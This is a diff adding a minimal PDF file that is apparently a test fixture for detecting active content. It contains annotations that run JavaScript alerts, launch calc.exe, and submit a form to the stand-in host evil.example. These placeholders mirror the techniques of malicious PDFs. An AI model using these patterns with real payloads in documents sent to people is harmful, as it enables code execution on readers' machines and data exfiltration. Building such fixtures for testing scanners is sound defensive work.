@@ -1,0 +1,48 @@
+%PDF-1.3
+%¿÷¢þ
+1 0 obj
+<< /Pages 2 0 R /Type /Catalog >>
+endobj
+2 0 obj
+<< /Count 1 /Kids [ 3 0 R ] /Type /Pages >>
+endobj
+3 0 obj
+<< /Annots [ 4 0 R 5 0 R 6 0 R 7 0 R ] /Contents 8 0 R /MediaBox [ 0 0 595 842 ] /Parent 2 0 R /Resources << >> /Type /Page >>
+endobj
+4 0 obj
+<< /A << /Next 9 0 R /S /URI /URI (https://example.com) >> /Rect [ 50 50 200 80 ] /Subtype /Link /Type /Annot >>
+endobj
+5 0 obj
+<< /A << /JS (app.alert\('widget'\)) /S /JavaScript >> /FT /Btn /Rect [ 50 100 200 130 ] /Subtype /Widget /T (b) /Type /Annot >>
+endobj
+6 0 obj
+<< /A << /F (calc.exe) /S /Launch >> /Rect [ 50 150 200 180 ] /Subtype /Square /Type /Annot >>
+endobj
+7 0 obj
+<< /A << /F << /F (https://evil.example/x) /FS /URL >> /S /SubmitForm >> /Rect [ 50 200 200 230 ] /Subtype /Link /Type /Annot >>
+endobj
+8 0 obj
+<< /Length 0 /Filter /FlateDecode >>
+stream
+
+endstream
+endobj
+9 0 obj
+<< /JS (app.alert\('next'\)) /S /JavaScript >>
+endobj
+xref
+0 10
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000123 00000 n 
+0000000265 00000 n 
+0000000393 00000 n 
+0000000537 00000 n 
+0000000647 00000 n 
+0000000791 00000 n 
+0000000861 00000 n 
+trailer << /Root 1 0 R /Size 10 /ID [<35007fe31a7996bf9b1810da5a7fdec5><35007fe31a7996bf9b1810da5a7fdec5>] >>
+startxref
+923
+%%EOF
